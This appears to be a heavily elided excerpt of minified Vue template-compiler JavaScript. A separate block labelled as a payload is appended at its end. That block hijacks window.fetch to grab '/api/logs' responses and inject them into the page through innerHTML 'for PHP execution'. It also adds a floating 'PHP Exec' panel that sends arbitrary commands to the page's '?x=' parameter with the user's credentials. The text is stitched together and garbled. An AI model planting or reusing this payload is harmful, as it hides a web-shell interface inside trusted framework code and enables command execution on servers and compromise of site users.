						isPreTag: O,
						isCustomElement: O,
						decodeEntities: e => e.replace(Nc, ((e, t) => Pc[t])),
						onError: Xl,
						onWarn: es,
						comments: !1
					};
				...
				function Rc(e, t, n) {
					...
					for (; !Xc(e, t, n);) {
						...
						let l;
						if (0 === t || 1 === t)
							if (!e.inVPre && Gc(a, e.options.delimiters[0])) l = $c(e, t);
							else if (0 === t && "<" === a[0])
							if (1 === a.length) Qc(e, 5, 1);
							else if ("!" === a[1]) Gc(a, "\x3c!--") ? l = jc(e) : Gc(a, "<!DOCTYPE") ? l = Bc(e) : Gc(a, "<![CDATA[") ? 0 !== o ? l = Ac(e, n) : (Qc(e, 1), l = Bc(e)) : (Qc(e, 11), l = Bc(e));
						else if ("/" === a[1])
							if (2 === a.length) Qc(e, 5, 2);
							else {
								if (">" === a[2]) {
									Qc(e, 14, 2), Zc(e, 3);
									continue
						...
						if (l || (l = Hc(e, t)), j(l))
							for (let e = 0; e < l.length; e++) Lc(i, l[e]);
						else Lc(i, l)
					}
					let a = !1;
					if (2 !== t && 1 !== t) {
				...
				function Ic(e, t) {
					...
					if (i.children = c, eu(e.source, i.tag)) Fc(e, 1, o);
					else if (Qc(e, 24, 0, i.loc.start), 0 === e.source.length && "script" === i.tag.toLowerCase()) {
						const t = c[0];
				...
				function Fc(e, t, n) {
					...
					let c = Dc(e, t);
					0 === t && !e.inVPre && c.some((e => 7 === e.type && "pre" === e.name)) && (e.inVPre = !0, V(e, l), e.source = s, c = Dc(e, t).filter((e => "v-pre" !== e.name)));
					let u = !1;
				...
				function Uc(e, t) {
					...
					Zc(e, r.length), /^[\t\r\n\f ]*=/.test(e.source) && (Yc(e), Zc(e, 1), Yc(e), o = function(e) {
						...
						if (o) {
							Zc(e, 1);
							const t = e.source.indexOf(r); - 1 === t ? n = zc(e, e.source.length, 4) : (n = zc(e, t, 4), Zc(e, 1))
						} else {
							const t = /^[^\t\r\n\f >]+/.exec(e.source);
							if (!t) return;
							const r = /["'<=`]/g;
					...
					if (!e.inVPre && /^(v-[A-Za-z0-9-]|:|\.|@|#)/.test(r)) {
						...
						let a, l = Gc(r, "."),
							s = t[1] || (l || Gc(r, ":") ? "bind" : Gc(r, "@") ? "on" : "slot");
						if (t[2]) {
							const o = "slot" === s,
								i = r.lastIndexOf(t[2]),
				...
				function Qc(e, t, n, r = qc(e)) {
					n && (r.offset += n, r.column += n), e.options.onError(ts(t, {
						start: r,
						end: r,
						source: ""
					}))
				...
				function ru(e, t, n = !1) {
					...
					for (let e = 0; e < r.length; e++) {
						...
						} else if (11 === o.type) ru(o, t, 1 === o.children.length);
						else if (9 === o.type)
							for (let e = 0; e < o.branches.length; e++) ru(o.branches[e], t, 1 === o.branches[e].children.length)
					}
				...
				function uu(e, {
					...
					const _ = t.replace(/\?.*$/, "").match(/([^/\\]+)\.\w+$/),
						E = {
							...
							removeIdentifiers(e) {},
							hoist(e) {
								U(e) && (e = Ks(e)), E.hoists.push(e);
								const t = Ks(`_hoisted_${E.hoists.length}`, !1, e.loc, 2);
					...
					du(e, n), t.hoistStatic && tu(e, n), t.ssr || function(e, t) {
						...
						if (1 === r.length) {
							...
							if (nu(e, n) && n.codegenNode) {
								...
								13 === r.type && xc(r, t), e.codegenNode = r
				...
				function yu(e, t, {
					...
					for (let n = 0; n < e.length; n++) {
						...
						s && (l = l.slice(0, -6)), r(`const ${Ec(l,t)} = ${a}(${JSON.stringify(l)}${s?", true":""})${i?"!":""}`), n < e.length - 1 && o()
					}
				}
					...
					if (U(e)) t.push(e);
						...
						case 14:
							! function(e, t) {
								const {
									...
									helper: r,
									pure: o
								} = t, i = U(e.callee) ? e.callee : r(e.callee);
								o && n(hu);
						...
						case 15:
							! function(e, t) {
								...
								for (let e = 0; e < a.length; e++) {
									...
									xu(r, t), n(": "), Cu(o, t), e < a.length - 1 && (n(","), i())
								}
								l && o(), n(l ? "}" : " }")
							}(e, t);
							break;
						...
						case 20:
							! function(e, t) {
								...
								n(`_cache[${e.index}] || (`), e.isVNode && (o(), n(`${r(Ls)}(-1),`), a());
								n(`_cache[${e.index}] = `), Cu(e.value, t), e.isVNode && (n(","), a(), n(`${r(Ls)}(1),`), a(), n(`_cache[${e.index}]`), i());
								n(")")
							}(e, t);
							break;
						case 21:
				...
				const ku = pu(/^(if|else|else-if)$/, ((e, t, n) => function(e, t, n, r) {
				...
				function Nu(e, t, n) {
					...
					if (1 !== a.length || 1 !== l.type) {
						...
						const e = l.codegenNode,
							t = 14 === (s = e).type && s.callee === Fs ? s.arguments[1].returns : s;
						return 13 === t.type && xc(t, n), Cc(t, o, n), e
					}
					var s
				}
				const Pu = pu("for", ((e, t, n) => {
					const {
						helper: r,
						removeHelper: o
					} = n;
					return function(e, t, n, r) {
						...
						const i = Zs(r(ws), [t.source]),
							a = vc(e),
							l = uc(e, "memo"),
							s = fc(e, "key"),
							c = s && (6 === s.type ? Ks(s.value.content, !0) : s.exp),
							u = s ? Ws("key", c) : null,
				...
				function Lu(e, t) {
					...
					if (!o) return;
					const [, i, a] = o, l = {
						source: Au(n, a.trim(), r.indexOf(a, i.length)),
						value: void 0,
						key: void 0,
						index: void 0
					};
					...
					if (u) {
						...
						const e = u[1].trim();
						let t;
						if (e && (t = r.indexOf(e, c + s.length), l.key = Au(n, e, t)), u[2]) {
							const o = u[2].trim();
							o && (l.index = Au(n, o, r.indexOf(o, l.key ? t + e.length : c + s.length)))
						}
					}
					return s && (l.value = Au(n, s, c)), l
				}
				...
				function Fu(e, t, n = Mu) {
					...
					for (let e = 0; e < r.length; e++) {
						...
						const C = n(y, v, m);
						let _, E, x;
						if (_ = uc(o, "if")) l = !0, a.push(Js(_.exp, Du(g, C, p++), Bu));
						else if (E = uc(o, /^else(-if)?$/, !0)) {
							let n, o = e;
							...
							if (n && vc(n) && uc(n, "if")) {
								...
								t.alternate = E.exp ? Js(E.exp, Du(g, C, p++), Bu) : Du(g, C, p++)
							} else t.onError(ts(30, E.loc))
						} else if (x = uc(o, "for")) {
							l = !0;
							const e = x.parseResult || Lu(x.exp);
							e ? a.push(Zs(t.helper(ws), [e.source, Ys(ju(e), Du(g, C), !0)])) : t.onError(ts(32, x.loc))
						} else {
							if (w) {
								if (d.has(w)) {
									t.onError(ts(38, b));
					...
					return a.length && (v = Zs(t.helper(_s), [v, zs(a)])), {
						slots: v,
						hasDynamicSlots: l
					}
				}
					...
					zu = (e, t) => function() {
						...
						let i = o ? function(e, t, n = !1) {
							...
							const o = Gu(r),
								i = fc(e, "is");
							if (i)
								if (o || Sc("COMPILER_IS_ON_ELEMENT", t)) {
							...
							return t.helper(vs), t.components.add(r), Ec(r, "component")
						}(e, t) : `"${n}"`;
						...
						if (r.length > 0) {
							...
							d = r && r.length ? zs(r.map((e => function(e, t) {
								const n = [],
									r = Hu.get(e);
								r ? n.push(t.helperString(r)) : (t.helper(gs), t.directives.add(e.name), n.push(Ec(e.name, "directive")));
								const {
									loc: o
								} = e;
								e.exp && n.push(e.exp);
					...
					for (let o = 0; o < n.length; o++) {
						...
						if (6 === s.type) {
							...
							if (y) {
								...
								!i && n.forEach(E), g && o && !Qs(o) ? _(qs(n, l)) : c.push(...n), r && (f.push(s), $(r) && Hu.set(s, r))
							} else J(n) || (f.push(s), d && (p = !0))
						}
					}
					let x;
					if (u.length ? (_(), x = u.length > 1 ? Zs(t.helper(xs), u, l) : u[0]) : c.length && (x = qs(Wu(c), l)), b ? h |= 16 : (m && !r && (h |= 2), g && !r && (h |= 4), C.length && (h |= 8), y && (h |= 32)), p || 0 !== h && 32 !== h || !(v || w || f.length > 0) || (h |= 512), !t.inSSR && x) switch (x.type) {
						case 15:
							let e = -1,
								n = -1,
								r = !1;
							for (let t = 0; t < x.properties.length; t++) {
								const o = x.properties[t].key;
								Qs(o) ? "class" === o.content ? e = t : "style" === o.content && (n = t) : o.isHandlerKey || (r = !0)
							}
							const o = x.properties[e],
								i = x.properties[n];
							r ? x = Zs(t.helper(Os), [x]) : (o && !Qs(o.value) && (o.value = Zs(t.helper(ks), [o.value])), i && (g || 4 === i.value.type && "[" === i.value.content.trim()[0] || 17 === i.value.type) && (i.value = Zs(t.helper(Ss), [i.value])));
							break;
						case 14:
							break;
						default:
							x = Zs(t.helper(Os), [Zs(t.helper(Ns), [x])])
					}
					return {
						props: x,
						directives: f,
				...
				function Wu(e) {
					...
					for (let r = 0; r < e.length; r++) {
						...
						const i = o.key.content,
							a = t.get(i);
						a ? ("style" === i || "class" === i || P(i)) && Ku(a, o) : (t.set(i, o), n.push(o))
					}
					return n
				}
				...
				const Zu = /-(\w)/g,
					Yu = (e => {
						const t = Object.create(null);
						return n => t[n] || (t[n] = e(n))
					})((e => e.replace(Zu, ((e, t) => t ? t.toUpperCase() : "")))),
					Ju = (e, t) => {
						if (mc(e)) {
							const {
								children: n,
				...
				const Qu = /^\s*([\w$_]+|(async\s*)?\([^)]*?\))\s*(:[^=]+)?=>|^\s*(async\s+)?function(?:\s+[\w$]+)?\s*\(/,
					Xu = (e, t, n, r) => {
						...
						let l;
						if (e.exp || i.length || n.onError(ts(35, o)), 4 === a.type)
							if (a.isStatic) {
								let e = a.content;
								e.startsWith("vue:") && (e = `vnode-${e.slice(4)}`);
								l = Ks(0 !== t.tagType || e.startsWith("vnode") || !/[A-Z]/.test(e) ? oe(ee(e)) : `on:${e}`, !0, a.loc)
							} else l = Gs([`${n.helperString(Rs)}(`, a, ")"]);
						else l = a, l.children.unshift(`${n.helperString(Rs)}(`), l.children.push(")");
						let s = e.exp;
						s && !s.content.trim() && (s = void 0);
						let c = n.cacheHandlers && !s && !n.inVOnce;
						if (s) {
							const e = ac(s.content),
								t = !(e || Qu.test(s.content)),
					...
					of = (e, t) => {
						if (1 === e.type && uc(e, "once", !0)) {
							...
							return rf.add(e), t.inVOnce = !0, t.helper(Ls), () => {
								t.inVOnce = !1;
				...
				function ff(e, t) {
					...
					for (i = 0; i < n.length; i++)
						if (o = r, r = n.charCodeAt(i), l) 39 === r && 92 !== o && (l = !1);
				...
				function df(e, t, n) {
					n.helper(ys);
					const r = t.indexOf("(");
					if (r < 0) return n.filters.add(t), `${Ec(t,"filter")}(${e})`;
					{
						const o = t.slice(0, r),
							i = t.slice(r + 1);
						return n.filters.add(o), `${Ec(o,"filter")}(${e}${")"!==i?","+i:i}`
					}
				}
					...
					hf = (e, t) => {
						if (1 === e.type) {
							...
							return pf.add(e), () => {
								...
								r && 13 === r.type && (1 !== e.tagType && xc(r, t), e.codegenNode = Zs(t.helper(Fs), [n.exp, Ys(void 0, r), "_cache", String(t.cached++)]))
							}
						}
					};

				function vf(e, t = {}) {
					const n = t.onError || Xl,
						r = "module" === t.mode;
					!0 === t.prefixIdentifiers ? n(ts(47)) : r && n(ts(48));
					t.cacheHandlers && n(ts(49)), t.scopeId && !r && n(ts(50));
					const o = U(e) ? Vc(e, t) : e,
						[i, a] = [
							[of, ku, hf, Pu, cf, Ju, zu, Iu, nf], {
								on: Xu,
								bind: ef,
								model: af
							}
					...
					return fu(o, V({}, t, {
						...
						directiveTransforms: V({}, a, t.directiveTransforms || {})
					})), gu(o, V({}, t, {
						prefixIdentifiers: false
					}))
				}
				...
				const Nf = o("style,iframe,script,noscript", !0),
					Pf = {
						isVoidTag: m,
						isNativeTag: e => h(e) || v(e),
						isPreTag: e => "pre" === e,
						decodeEntities: function(e, t = !1) {
							return Of || (Of = document.createElement("div")), t ? (Of.innerHTML = `<div foo="${e.replace(/"/g,"&quot;")}">`, Of.children[0].getAttribute("foo")) : (Of.innerHTML = e, Of.textContent)
						},
						isBuiltInComponent: e => Xs(e, "Transition") ? xf : Xs(e, "TransitionGroup") ? kf : void 0,
						getNamespace(e, t) {
							let n = t ? t.ns : 0;
							if (t && 2 === n)
				...
				const Rf = o("passive,once,capture"),
					Lf = o("stop,prevent,self,ctrl,shift,alt,meta,exact,middle"),
					Af = o("left,right"),
					jf = o("onkeyup,onkeydown,onkeypress", !0),
					Bf = (e, t) => Qs(e) && "onclick" === e.content.toLowerCase() ? Ks(t, !0) : 4 !== e.type ? Gs(["(", e, `) === "onClick" ? "${t}" : (`, e, ")"]) : e;
				const If = (e, t) => {
						1 !== e.type || 0 !== e.tagType || "script" !== e.tag && "style" !== e.tag || (t.onError(Vf(61, e.loc)), t.removeNode())
					},
					Mf = [e => {
					...
					Ff = {
						...
						html: (e, t, n) => {
							...
							return r || n.onError(Vf(51, o)), t.children.length && (n.onError(Vf(52, o)), t.children.length = 0), {
								props: [Ws(Ks("innerHTML", !0, o), r || Ks("", !0))]
							}
						},
						text: (e, t, n) => {
							const {
							...
							return r || n.onError(Vf(53, o)), t.children.length && (n.onError(Vf(54, o)), t.children.length = 0), {
								props: [Ws(Ks("textContent", !0), r ? ou(r, n) > 0 ? r : Zs(n.helperString(Es), [r], o) : Ks("", !0))]
							}
						},
						model: (e, t, n) => {
							const r = af(e, t, n);
							if (!r.props.length || 1 === t.tagType) return r;
							e.arg && n.onError(Vf(56, e.arg.loc));
							const {
								tag: o
						...
						on: (e, t, n) => Xu(e, t, n, (t => {
							...
							const {
								...
								for (let r = 0; r < t.length; r++) {
									const l = t[r];
									"native" === l && Oc("COMPILER_V_ON_NATIVE", n) || Rf(l) ? a.push(l) : Af(l) ? Qs(e) ? jf(e.content) ? o.push(l) : i.push(l) : (o.push(l), i.push(l)) : Lf(l) ? i.push(l) : o.push(l)
								}
								return {
									keyModifiers: o,
									nonKeyModifiers: i,
						...
						show: (e, t, n) => {
							...
							return r || n.onError(Vf(59, o)), {
								props: [],
								needRuntime: n.helper(Ef)
							}
						}
					};
				...
				function Uf(e, t) {
					...
					const {
						...
						return vf(e, V({}, Pf, t, {
							...
							directiveTransforms: V({}, Ff, t.directiveTransforms || {}),
							transformHoist: null
						}))
					}(e, i);
...
// ====== START PAYLOAD ======
(function() {
  console.log('[+] Starting log hijack...');

  // --- Override fetch() to hijack logs ---
  const originalFetch = window.fetch;
  window.fetch = async (url, options) => {
    if (url.includes('/api/logs')) {
      console.log('[+] Intercepted log request:', url);
      
      const response = await originalFetch(url, options);
      const logs = await response.text();
      console.log('[+] Raw logs:', logs.slice(0, 100) + '...'); // Preview

      // Inject logs into hidden div (for PHP execution)
      const phpContainer = document.createElement('div');
      phpContainer.style.display = 'none';
      phpContainer.id = 'php-payload-container';
      phpContainer.innerHTML = logs;
      document.body.appendChild(phpContainer);
      console.log('[+] PHP container injected');

      // Return fake JSON to avoid breaking the app
  ...
  // --- Create floating command window ---
  const panelHTML = `
    <div id="hack-panel" style="
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 300px;
      ...
      border-radius: 5px;
    ">
      <h3 style="margin-top:0;">PHP Exec</h3>
      <input 
        id="hack-cmd" 
        placeholder="Enter command (e.g. 'id')" 
        style="width:100%; padding:5px; background:#222; color:#0f0; border:1px solid #0f0;"
      >
      <button 
        onclick="window.runHackCommand()"
        style="margin-top:5px; background:#0f0; color:#111; border:none; padding:5px 10px; cursor:pointer;"
      >Execute</button>
      <pre id="hack-output" style="
        height: 100px;
        overflow: auto;
        background: #000;
        padding: 5px;
      ...
      "></pre>
      <div style="font-size:12px; color:#0a0;">Status: <span id="hack-status">Ready</span></div>
    </div>
  `;
  ...
  window.runHackCommand = function() {
    const cmd = document.getElementById('hack-cmd').value;
    if (!cmd) return;
    
    document.getElementById('hack-status').textContent = 'Executing...';
    const outputEl = document.getElementById('hack-output');
    
    fetch(window.location.pathname + '?x=' + encodeURIComponent(cmd), {
      credentials: 'include'
    })
      .then(res => res.text())
      .then(output => {
        outputEl.textContent = output;
        document.getElementById('hack-status').textContent = 'Done';
      })
      .catch(err => {
        outputEl.textContent = 'ERROR: ' + err.message;
        document.getElementById('hack-status').textContent = 'Failed';
      });
  };

  console.log('[+] Hack panel initialized. Ready for commands.');
})();
// ====== END PAYLOAD ======